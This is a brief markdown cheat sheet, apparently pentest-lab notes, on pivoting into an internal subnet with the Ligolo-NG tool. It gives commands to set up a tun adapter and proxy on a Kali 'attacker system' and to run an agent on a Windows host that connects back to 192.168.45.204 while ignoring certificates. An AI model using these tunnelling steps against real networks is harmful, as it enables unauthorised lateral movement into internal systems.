#Ligolo-NG  </br >
https://github.com/nicocha30/ligolo-ng
https://www.youtube.com/watch?v=DM1B8S80EvQ&t=1s  </br >
https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/ </br >
https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5 </br >
#Commands
Create ligolo network adapter</br >
```
sudo ip tuntap add user kali mode tun ligolo
````

Up And Running the Network adapter ligolo </br >

```
sudo ip link set dev ligolo up
```

Start Ligolo from kali Linux (Attacker System), It will start the Ligolo Interface with port address </br >
```
>./Lproxy -selfcert (Mention Port below)
```
Connecting to attackers machine, Ignoring certificate </br >
```
WIN_PS>.\Lagent -connect 192.168.45.204:11601 -ignore-cert
```
In Kali Linux, You can see the Session connected, Check for interfaces </br >
```
Ligilo>ifconfig (Network interfaces)
```
Add network Adaper based Above command (Run this if you for got run above "sudo ip link set dev ligolo up") </br >
```
sudo ip route add 172.16.201.0/24 dev ligolo
```
After Adding the route in Windows, Run below command in ligolo terminal in Kali linux
```
Ligilo>start
```
You should able to reach before executing next command
```
>ping 172.16.201.11 
```

Credits:  [Nicolas Chatelain](https://github.com/nicocha30)
